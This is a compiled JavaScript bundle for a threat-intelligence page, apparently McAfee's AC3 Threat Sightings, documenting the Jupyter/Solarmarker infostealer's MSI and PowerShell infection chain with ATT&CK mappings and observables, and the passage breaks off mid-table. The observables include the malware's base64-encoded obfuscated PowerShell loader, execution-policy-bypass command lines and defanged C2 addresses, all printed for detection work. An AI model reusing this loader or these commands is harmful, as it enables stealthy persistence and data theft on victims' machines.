"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[7135],{3248:function(e,t,a){var n=a(7294),r=a(7273);r.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,n.useEffect)((function(){r.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},t)}},6180:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return s},contentTitle:function(){return d},metadata:function(){return m},toc:function(){return c},default:function(){return p}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),i=a(3248),o=["components"],s={},d=void 0,m={unversionedId:"Sightings/Jupyter_InfoStealer",id:"Sightings/Jupyter_InfoStealer",isDocsHomePage:!1,title:"Jupyter_InfoStealer",description:"Overview",source:"@site/docs/03-Sightings/05-Jupyter_InfoStealer.md",sourceDirName:"03-Sightings",slug:"/Sightings/Jupyter_InfoStealer",permalink:"/ac3-threat-sightings/docs/Sightings/Jupyter_InfoStealer",tags:[],version:"current",sidebarPosition:5,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"BlackCat_Ransomware",permalink:"/ac3-threat-sightings/docs/Sightings/BlackCat_Ransomware"},next:{title:"Raccoon_InfoStealer",permalink:"/ac3-threat-sightings/docs/Sightings/Raccoon_InfoStealer"}},c=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat Actor used <em>Search Engine Optimization poisoning</em> to lure victims to download compromissed installers for Initial Access.",id:"threat-actor-used-search-engine-optimization-poisoning-to-lure-victims-to-download-compromissed-installers-for-initial-access",children:[]},{value:"Threat Actor used malicious <em>.MSI</em> files to lure victims for Execution.",id:"threat-actor-used-malicious-msi-files-to-lure-victims-for-execution",children:[]},{value:"Threat Actor used <em>.MSI</em> Custom Actions to launch <em>PowerShell</em> script for Execution.",id:"threat-actor-used-msi-custom-actions-to-launch-powershell-script-for-execution",children:[]},{value:"Threat Actor used <em>PowerShell</em> to drop <em>.LNK</em> files into Windows Start Up folder for Persistence.",id:"threat-actor-used-powershell-to-drop-lnk-files-into-windows-start-up-folder-for-persistence",children:[]},{value:"Threat Actor used <em>PowerShell</em> to modify file association in Windows Registry for Persistence.",id:"threat-actor-used-powershell-to-modify-file-association-in-windows-registry-for-persistence",children:[]},{value:"Threat Actor used <em>PowerShell</em> to drive network connections to C2 server for Command And Control.",id:"threat-actor-used-powershell-to-drive-network-connections-to-c2-server-for-command-and-control",children:[]}]}],u={toc:c};function p(e){var t=e.components,a=(0,r.Z)(e,o);return(0,l.kt)("wrapper",(0,n.Z)({},u,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"This Threat Sighting documents initial infection of Jupyter Infostealer/Backdoor InfoStealer. Jupyter (a.k.a. Solarmarker, Polazert, YellowCockatoo) targets primarily Chromium, Firefox, and Chrome browser data and has backdoor/RAT capabilities. Jupyter stealer was bundled with the installer of commercial sofware tool (Nitro Pro 13). Likely the malicious installer was distributed via Search Engine Optimization (SEO) poisoning. This Threat Sightings combines results of open source / public intel with analysis of our telemetry."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Jupyter_InfoStealer.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Jupyter_InfoStealer.yml")),(0,l.kt)("p",null,"Author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)"),(0,l.kt)("p",null,"Acknowledgements: Nadav Lorber @ morphisec"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://blog.morphisec.com/new-jupyter-evasive-delivery-through-msi-installer"},"https://blog.morphisec.com/new-jupyter-evasive-delivery-through-msi-installer")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://app.any.run/tasks/907ef6c5-5fb6-4af7-acf6-d74b413fe1d2/"},"https://app.any.run/tasks/907ef6c5-5fb6-4af7-acf6-d74b413fe1d2/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://app.any.run/tasks/d8c1f63c-4048-44fa-8dd2-978cd467fd8e/"},"https://app.any.run/tasks/d8c1f63c-4048-44fa-8dd2-978cd467fd8e/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.esentire.com/blog/solarmarker-shifts-infrastructure-in-recent-drive-by-attacks"},"https://www.esentire.com/blog/solarmarker-shifts-infrastructure-in-recent-drive-by-attacks")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://squiblydoo.blog/2021/09/18/solarmarker-registry-key-persistence-walkthrough/"},"https://squiblydoo.blog/2021/09/18/solarmarker-registry-key-persistence-walkthrough/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://squiblydoo.blog/2021/06/20/mars-deimos-from-jupiter-to-mars-and-back-again-part-two/"},"https://squiblydoo.blog/2021/06/20/mars-deimos-from-jupiter-to-mars-and-back-again-part-two/")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://twitter.com/MsftSecIntel/status/1403461398810685440"},"https://twitter.com/MsftSecIntel/status/1403461398810685440")),(0,l.kt)("li",{parentName:"ul"},"Internal hunting")),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"Search Engine Optimization poisoning")," to lure victims to download compromissed installers for Initial Access."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"li"},".MSI")," files to lure victims for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},".MSI")," Custom Actions to launch ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," script for Execution."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," to drop ",(0,l.kt)("em",{parentName:"li"},".LNK")," files into Windows Start Up folder for Persistence."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," to modify file association in Windows Registry for Persistence."),(0,l.kt)("li",{parentName:"ul"},"Threat Actor used ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," to drive network connections to C2 server for Command And Control.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(i.Z,{chart:"\ngraph LR\nIA[Initial Access] --\x3e | _Search Engine Optimization poisoning_ to lure victims to download compromissed installers| IA[Initial Access]\nIA[Initial Access] --\x3e | malicious _.MSI_ files to lure victims| EXE[Execution]\nEXE[Execution] --\x3e | _.MSI_ Custom Actions to launch _PowerShell_ script| EXE[Execution]\nEXE[Execution] --\x3e | _PowerShell_ to drop _.LNK_ files into Windows Start Up folder| PER[Persistence]\nEXE[Execution] --\x3e | _PowerShell_ to modify file association in Windows Registry| PER[Persistence]\nEXE[Execution] --\x3e | _PowerShell_ to drive network connections to C2 server| C2[Command And Control]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1189 - Drive-by Compromise"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Search Engine Optimization poisoning")," to lure victims to download compromissed installers for Initial Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204 - User Execution",(0,l.kt)("br",null),"T1218.007 - Signed Binary Proxy Execution: Msiexec"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"td"},".MSI")," files to lure victims for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},".MSI")," Custom Actions to launch ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," script for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to drop ",(0,l.kt)("em",{parentName:"td"},".LNK")," files into Windows Start Up folder for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1112 - Modify Registry",(0,l.kt)("br",null),"T1546.001 - Event Triggered Execution: Change Default File Association",(0,l.kt)("br",null),"T1027 - Obfuscated Files or Information",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to modify file association in Windows Registry for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to drive network connections to C2 server for Command And Control.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1189"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"Search Engine Optimization poisoning")," to lure victims to download compromissed installers for Initial Access."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Metlife-Disability-Waiver-Of-Premium-Benefit-Rider.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Medical-Engagement-Scale-Questionnaire.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Due-Diligence-Checklist-For-Oil-And-Gas-Properties.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Non-Renewal-Of-Lease-Letter-To-Landlord-From-Tenant.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Fedex-Tracking-By-Shipper-Receipt.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Christian-Doctrine-Clauses-List.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Omnicell-Cabinet-User-Manual.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Wells-Fargo-Subpoena-Processing-Department-Phoenix-Az.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Bulgarian Power Burst Training pdf.msiapp.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Mcat-Accommodations-Personal-Statement-Example.msi")),(0,l.kt)("td",{parentName:"tr",align:null},"- Drive-By download is a social engineering attack technique in which users download a malicious file on their devices unknowingly.",(0,l.kt)("br",null),"- Solarmarker Remote Access Trojan is known to be delivered via Search Engine Optimization (SEO) poisoning.",(0,l.kt)("br",null),"- SEO poisoning is an old attacking technique in which threat actors create malicious websites and make them appear on top in search results.",(0,l.kt)("br",null),"- MSI is an installer package file format used by Windows.",(0,l.kt)("br",null),"- This MSI file is generated with Advanced Installer, an all-in-one Application Packaging Tool for Software Developers and IT Professionals.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1204",(0,l.kt)("br",null),"T1218.007"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"td"},".MSI")," files to lure victims for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'"C:\\\\Windows\\\\System32\\\\msiexec.exe" /i "C:\\\\Users\\\\#{user}\\\\Desktop\\\\Metlife-Disability-Waiver-Of-Premium-Benefit-Rider.msi"'),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\MSI2C32.tmp"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\MSI2C33.tmp"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\msiexec.exe /V"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\system32\\\\MsiExec.exe -Embedding E1719003B1274EAD56C181C06EC4D717 C"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\scr2C81.ps1"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\msi2C71.txt"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\pss2C93.ps1")),(0,l.kt)("td",{parentName:"tr",align:null},"- MsiExec.exe is the executable program of the Windows Installer used to interpret installation packages and install products.",(0,l.kt)("br",null),"- Parameter /i installs or configures a product",(0,l.kt)("br",null),"- The nitro executable is only to make the victim believe that it is a normal installation.",(0,l.kt)("br",null),"- PowerShellScriptLauncher.dll is part of Advanced Installer an all-in-one Application Packaging Tool for Software Developers and IT Professionals.",(0,l.kt)("br",null),"- PowerShellScriptLauncher.dll is used to launch PowerShell custom actions during MSI installation.",(0,l.kt)("br",null),"- This is the Windows Installer service process",(0,l.kt)("br",null),"- This is the custom action server (indicated by the -Embedding switch)",(0,l.kt)("br",null),"- The parentProcess is the last one. id:9e207520-455b-41bb-9d4d-9d6443c1ac53",(0,l.kt)("br",null),"- These files are dropped from the attribute CustomAction of the MSI file")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},".MSI")," Custom Actions to launch ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," script for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},' -NoProfile -Noninteractive -ExecutionPolicy Bypass -File "C:\\\\Users\\\\#{user}\\AppData\\\\Local\\\\Temp\\\\pss2C93.ps1" -propFile "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\msi2C71.txt" -scriptFile "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\scr2C81.ps1" -scriptArgsFile "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\scr2C82.txt" -propSep " :<->: " -testPrefix "_testValue."')),(0,l.kt)("td",{parentName:"tr",align:null},"- This script is the CustomAction of the first MSI installer.",(0,l.kt)("br",null),"- These files executed were dropped before for the final MSI execution id:07cd7030-ea5a-4ed1-9f40-03deffe3f587")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1547.001",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to drop ",(0,l.kt)("em",{parentName:"td"},".LNK")," files into Windows Start Up folder for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\miCroSoFt\\\\WINDOwS\\\\stARt MENU\\\\PRogrAMs\\\\staRtuP\\\\aad8174b5ff4d3bc9e9443812d0b0.lnK")),(0,l.kt)("td",{parentName:"tr",align:null},"- LNK files are shortcut files used by Microsoft Windows")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1112",(0,l.kt)("br",null),"T1546.001",(0,l.kt)("br",null),"T1027",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to modify file association in Windows Registry for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"RegValue Created"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"HKEY_CLASSES_ROOT\\\\nnfjzceglbgu\\\\shell\\\\open\\\\command")),(0,l.kt)("td",{parentName:"tr",align:null},"- Full registry value encoded b64 -  UG9XRVJTaEVsbCAtV2lOZE93c3R5TGUgaGlERGVOIC1lUCBCWVBBc3MgLWNvTU1BTkQgIiRhOTBkYzYxYjg4NzRlYjk0ZjE5Njg4N2I1ZGMwMT0nWGpGcGNuNUFlMmQ1Wmo0MGZtbExibGw0YUd0clFYSitiRzVXSzI5cWVITlRRaXB4VENFeVRHeEVkbkpYZUROeVlESnpSanRhUjJzckxYY3RhMFF0YURabmZXeEhQbmhnZDBsa2FVaHlRRlpyUEQ1QWRWa21abDR4YUhCOFFHQjdVMEplVFhSRFlsNVBWWGh6UUh4RFlGZEFVeVk0ZFY1UWMySllYbTUwYlhkQWRUQTBaMEI3Y0hNd1FIeENOWDVlVVdaV0tsNXZOamxFUUg1NVozRkFVMk5KU0Y0d1kzdDMnOyRhYWNmMDhkYjVjNjQ5MWJhMDQ1NWEyYWRlY2EzMz1bU3lTdGVNLklvLkZpTEVdOjpSZWFkQUxsQllURVMoJ0M6XFVzZXJzXGFkbWluXEFwcERhdGFcUm9hbWluZ1xNSWNST3NPRlRcVUpJakJUQ3JYZlx0bkhhaWJXT0FrTklSRkdlLmlvQXNLUlBTZUZybmpYR09WYU0nKTtmT1IoJGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhPTA7JGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhIC1sVCAkYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzMuQ091TnQ7KXtmb1IoJGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkPTA7JGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkIC1sVCAkYTkwZGM2MWI4ODc0ZWI5NGYxOTY4ODdiNWRjMDEubEVuZ3RoOyRhNjQyYjYzMGViYzQxM2JkM2MyZTIzZThmZDQyZCsrKXskYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzNbJGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhXT0kYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzNbJGEwOGZjNGIzYWIxNGI3YThkZDBjY2VjYzFhODZhXSAtYnhPUiAkYTkwZGM2MWI4ODc0ZWI5NGYxOTY4ODdiNWRjMDFbJGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkXTskYTA4ZmM0YjNhYjE0YjdhOGRkMGNjZWNjMWE4NmErKztpZigkYTA4ZmM0YjNhYjE0YjdhOGRkMGNjZWNjMWE4NmEgLUdFICRhYWNmMDhkYjVjNjQ5MWJhMDQ1NWEyYWRlY2EzMy5jb1VOVCl7JGE2NDJiNjMwZWJjNDEzYmQzYzJlMjNlOGZkNDJkPSRhOTBkYzYxYjg4NzRlYjk0ZjE5Njg4N2I1ZGMwMS5MRU5nVGh9fX07W3NZc3RFbS5yZUZsZUNUaW9uLkFTU0VtQkxZXTo6bG9hRCgkYWFjZjA4ZGI1YzY0OTFiYTA0NTVhMmFkZWNhMzMpO1ttYVJTLmRlSU1PU106OkluVGVyQUN0KCkiCgo=",(0,l.kt)("br",null),"- randomized file extension nnfjzceglbgu",(0,l.kt)("br",null),"- this file association will cause the execution of the highly obfuscated PowerShell command when the file extension is used",(0,l.kt)("br",null),"- System.Reflection.Assembly is used for execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.001",(0,l.kt)("br",null),"T1059.001"),(0,l.kt)("td",{parentName:"tr",align:null},"Threat Actor used ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," to drive network connections to C2 server for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"37.120.237[.]251"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"45.42.201[.]248")),(0,l.kt)("td",{parentName:"tr",align:null},"- These connections seems to be the C2 channel established between the powershell execution and the actor",(0,l.kt)("br",null),"- IP addresses correspond to Romania")))),(0,l.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,l.kt)("h3",{id:"threat-actor-used-search-engine-optimization-poisoning-to-lure-victims-to-download-compromissed-installers-for-initial-access"},"Threat Actor used ",(0,l.kt)("em",{parentName:"h3"},"Search Engine Optimization poisoning")," to lure victims to download compromissed installers for Initial Access."),(0,l.kt)("h4",{id:"tactic"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Initial Access")),(0,l.kt)("h4",{id:"techniques"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1189 - Drive-by Compromise")),(0,l.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1189"),(0,l.kt)("td",{parentName:"tr",align:null},"User is disguised to download a malicious installer via Search Engine Optimization (SEO) poisoning"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Metlife-Disability-Waiver-Of-Premium-Benefit-Rider.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Medical-Engagement-Scale-Questionnaire.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Due-Diligence-Checklist-For-Oil-And-Gas-Properties.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Non-Renewal-Of-Lease-Letter-To-Landlord-From-Tenant.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Fedex-Tracking-By-Shipper-Receipt.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Christian-Doctrine-Clauses-List.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Omnicell-Cabinet-User-Manual.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Wells-Fargo-Subpoena-Processing-Department-Phoenix-Az.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Bulgarian Power Burst Training pdf.msiapp.msi"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\Mcat-Accommodations-Personal-Statement-Example.msi"))))),(0,l.kt)("h4",{id:"notes"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Drive-By download is a social engineering attack technique in which users download a malicious file on their devices unknowingly."),(0,l.kt)("li",{parentName:"ul"},"Solarmarker Remote Access Trojan is known to be delivered via Search Engine Optimization (SEO) poisoning."),(0,l.kt)("li",{parentName:"ul"},"SEO poisoning is an old attacking technique in which threat actors create malicious websites and make them appear on top in search results."),(0,l.kt)("li",{parentName:"ul"},"MSI is an installer package file format used by Windows."),(0,l.kt)("li",{parentName:"ul"},"This MSI file is generated with Advanced Installer, an all-in-one Application Packaging Tool for Software Developers and IT Professionals.")),(0,l.kt)("h3",{id:"threat-actor-used-malicious-msi-files-to-lure-victims-for-execution"},"Threat Actor used malicious ",(0,l.kt)("em",{parentName:"h3"},".MSI")," files to lure victims for Execution."),(0,l.kt)("h4",{id:"tactic-1"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Execution")),(0,l.kt)("h4",{id:"techniques-1"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1204 - User Execution"),(0,l.kt)("li",{parentName:"ul"},"T1218.007 - Signed Binary Proxy Execution: 